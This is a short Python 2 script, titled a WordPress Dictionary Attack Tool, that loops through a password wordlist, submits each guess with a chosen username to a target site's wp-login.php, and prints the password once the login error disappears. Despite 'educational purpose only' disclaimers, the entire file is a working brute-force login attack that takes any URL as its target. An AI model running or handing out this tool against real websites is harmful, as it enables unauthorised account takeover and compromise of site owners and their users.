#!/usr/bin/python
# ----Wordpress Dictionary Attack Tool---- 
# 	Owner : Shalinda Weerasinghe 
# 	https://prot3ct3d.wordpress.com
# 	Date : 2017 - 03 - 06
#	example Usage : ./wp-dict <dictionary.txt> <http://something.com> <username>
# Do not Use on Commercial website! This is for learning purpose only 
# No Proxies are being used (yet)


import codecs
import string
import sys
import requests
import re
import urllib2
import urllib

print('|- - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --| ')
print('| 		 [-][-][-]     WP   Dictionary Attack Tool    [-][-][-]               | ')
print('|	[+]Owner : Shalinda Weerasinghe                                           | ')
print('|	[+] https://prot3ct3d.wordpress.com                                       | ')
print('|	[-] Usage : ./wp-dict <dictionary.txt> <http://something.com> <username>  | ')
print('|	[!] This script was written for educational purpose only....              | ')
print('| - - - -  - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  - - -| ')


if len(sys.argv)!= 4:
	print' Help '
else:
	host = "".join(sys.argv[2]+'/wp-login.php')
	try:
		r = requests.get(host)
        

		wordlist = open(sys.argv[1],"r")
		#host = "".join(sys.argv[2]+'/wp-login.php')
		username=sys.argv[3]
		print' [+] Dictionary File loaded : ',sys.argv[1]
		print' [+] Target URL             : ',host
		for word in wordlist:
			word=word.replace('\r','').replace('\n','').replace('\xe2\x80\x93','-')
			login_form_seq = [
			('log',username),
			('pwd',word),
			('rememberme', 'forever'),
			('wp-submit', 'Login >>'),
			('redirect_to', 'wp-admin/')]
			login_form_data = urllib.urlencode(login_form_seq)
			opener = urllib2.build_opener()
			site = opener.open(host, login_form_data).read()
			if re.search('<strong>ERROR</strong>',site):
				print('		[!] Login Failed: ')
			else:
				print'		[+] Login Successfull:	Password --> ',word
				break;
	except:       	
		print('[!]  URL Seems to be down or invalid ! ')
		print' [!] ',sys.argv[1],'Dictionary File Not found '
		print('[-] Usage : ./wp-dict <dictionary.txt> <http://something.com> <username>  | ')
